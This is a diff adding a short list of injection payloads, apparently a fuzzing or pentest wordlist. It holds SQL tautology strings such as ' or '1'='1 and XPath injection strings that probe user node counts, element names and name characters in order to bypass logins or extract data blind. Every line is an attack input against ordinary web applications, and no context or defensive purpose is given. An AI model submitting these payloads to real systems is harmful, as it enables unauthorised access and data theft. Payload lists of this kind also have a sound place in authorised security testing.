@@ -1,0 +1,9 @@
+' or '1'=1'
+" or "1"="1
+' or 1=1 or 'a'='a
+" or 1=1 or "a"="a
+' or count(//user)=1 or 'a'='b
+' or name()='admin' or '1'='2
+' or substring(name(),1,1)='a' or '1'='2
+admin' or '1'='1
+' or count(//user)=2 or '1'='1
